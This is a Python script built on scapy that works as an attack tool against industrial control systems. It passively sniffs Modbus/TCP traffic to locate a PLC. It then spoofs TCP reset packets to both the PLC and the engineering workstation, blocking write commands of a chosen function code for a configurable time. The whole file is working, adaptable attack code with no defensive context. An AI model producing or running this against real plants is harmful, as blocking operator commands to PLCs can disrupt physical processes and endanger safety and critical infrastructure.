import scapy.all as scapy
import socket
import struct
import time
import threading

# Configuration - Adapt these to your environment
INTERFACE = "eth0"  # Replace with your network interface name (e.g., 'eth0', 'en0', 'Wi-Fi')
PLC_IP = None  # Initially unknown, will be discovered
#TARGET_MAC = None # MAC address of the PLC (optional, can be auto-discovered)
TARGET_PORT = 502  # Typical Modbus/TCP port.  Change if your PLC uses a different one.
COMMAND_BLOCK_TIMEOUT = 10  # Duration (seconds) to block command messages
MODBUS_FUNCTION_CODE_TO_BLOCK = 6 # Modbus Write Single Register (example).  Modify as needed.
# MODBUS_REGISTER_ADDRESS_TO_BLOCK = None  # Could specify a specific register to block (Optional)

# Global flag to control the blocking thread
running = True
discovered_plc = False

def find_plc_ip():
    """
    Discovers the PLC's IP address by passively listening for Modbus traffic.
    This relies on the engineering workstation and PLC communicating.
    """
    global PLC_IP, discovered_plc
    print("[+] Discovering PLC IP address by sniffing Modbus traffic...")

    def packet_callback(packet):
        global PLC_IP, discovered_plc
        if scapy.TCP in packet and packet[scapy.TCP].dport == TARGET_PORT:
            # Check if it's coming from the PLC or going to it
            if scapy.IP in packet and packet[scapy.IP].src != socket.gethostbyname(socket.gethostname()):
                src_ip = packet[scapy.IP].src
                # try to unpack packet and see if function code = modbus
                try:
                    mbap_header = packet[scapy.Raw].load[:7]
                    unit_identifier = packet[scapy.Raw].load[6:7]
                    function_code = packet[scapy.Raw].load[7:8]
                    transaction_id = struct.unpack(">H", mbap_header[:2])[0]
                    protocol_id = struct.unpack(">H", mbap_header[2:4])[0]
                    length = struct.unpack(">H", mbap_header[4:6])[0]
                    # print(f"Transaction ID: {transaction_id}, Protocol ID: {protocol_id}, Length: {length}, Unit ID: {unit_identifier.hex()}, Function Code: {function_code.hex()}")
                    
                    # convert function code hex to dec
                    function_code_dec = struct.unpack("B", function_code)[0]

                    if src_ip != PLC_IP:
                        print(f"[+] Found potential PLC IP: {src_ip}")
                        PLC_IP = src_ip
                        discovered_plc = True
                        print(f"[+] PLC IP set to: {PLC_IP}")
                        return True  # Stop sniffing
                except Exception as e:
                    print(f"Error parsing packet: {e}")
                    pass # Not a valid Modbus packet

        return False # Continue Sniffing
    
    try:
        # Sniff packets for a limited time. Adjust timeout as needed.
        scapy.sniff(iface=INTERFACE, filter=f"tcp port {TARGET_PORT}", prn=packet_callback, stop_filter=packet_callback, timeout=10)
    except Exception as e:
        print(f"Error sniffing: {e}")
        return False


    if not PLC_IP:
        print("[!] Failed to discover PLC IP address.  Ensure the PLC and engineering workstation are communicating.")
        return False
    else:
        return True # PLC IP was discovered
    

def block_command_message():
    """
    Blocks Modbus/TCP command messages based on function code.
    Spoofs TCP Reset (RST) packets to terminate the connection.
    """
    global running

    def packet_callback(packet):
        global running
        if not running:
            return # Stop processing packets

        if scapy.IP in packet and scapy.TCP in packet:
            ip = packet[scapy.IP]
            tcp = packet[scapy.TCP]

            # Check for Modbus traffic (TCP port)
            if tcp.dport == TARGET_PORT or tcp.sport == TARGET_PORT:
                try:
                    mbap_header = packet[scapy.Raw].load[:7]
                    function_code = packet[scapy.Raw].load[7:8]

                    # convert function code hex to dec
                    function_code_dec = struct.unpack("B", function_code)[0]
                    #print(f"Function code: {function_code_dec}")
                    # Check if the function code matches the one we want to block
                    if function_code_dec == MODBUS_FUNCTION_CODE_TO_BLOCK:

                        # Optional: Check for specific register address (if needed)
                        # if MODBUS_REGISTER_ADDRESS_TO_BLOCK is not None:
                        #    register_address = struct.unpack(">H", packet[scapy.Raw].load[8:10])[0] # adjust offset if needed
                        #    if register_address != MODBUS_REGISTER_ADDRESS_TO_BLOCK:
                        #        return # Not the register we want to block

                        print(f"[!] Blocking Modbus command with function code: {function_code_dec}")

                        # Construct TCP Reset (RST) packet
                        ip_reset = scapy.IP(src=ip.src, dst=ip.dst)
                        tcp_reset = scapy.TCP(sport=tcp.sport, dport=tcp.dport,
                                            flags="R", seq=tcp.ack, ack=tcp.seq + len(packet[scapy.Raw])) # Important: Correct ACK/SEQ

                        # Send the RST packet to the PLC (terminate connection from PLC's perspective)
                        reset_packet_to_plc = ip_reset / tcp_reset
                        scapy.send(reset_packet_to_plc, verbose=0, iface=INTERFACE) # Suppress output
                        # Send the RST packet to the engineering workstation (terminate connection from workstation's perspective)
                        ip_reset = scapy.IP(src=ip.dst, dst=ip.src)
                        tcp_reset = scapy.TCP(sport=tcp.dport, dport=tcp.sport,
                                            flags="R", seq=tcp.seq, ack=tcp.ack)
                        reset_packet_to_workstation = ip_reset / tcp_reset
                        scapy.send(reset_packet_to_workstation, verbose=0, iface=INTERFACE) # Suppress output

                        print("[+] TCP Reset (RST) packets sent. Command blocked.")
                except Exception as e:
                    print(f"Error processing packet: {e}")
                    pass # Not a valid Modbus packet, or other issue
        else:
            pass # Not an IP/TCP Packet


    print(f"[+] Blocking Modbus commands for {COMMAND_BLOCK_TIMEOUT} seconds...")
    try:
        scapy.sniff(iface=INTERFACE, filter=f"tcp and host {PLC_IP}", prn=packet_callback, timeout=COMMAND_BLOCK_TIMEOUT)
    except Exception as e:
        print(f"Error sniffing: {e}")
    finally:
        print("[+] Command blocking stopped.")


def main():
    global running, PLC_IP

    # 1. Discover PLC IP address
    if not find_plc_ip():
        print("[!] Aborting due to PLC IP discovery failure.")
        return

    # 2.  Start Blocking
    try:
        block_command_message()
    except KeyboardInterrupt:
        print("\n[+] Program interrupted. Stopping...")
    finally:
        running = False # Signal the blocking thread to stop

if __name__ == "__main__":
    main()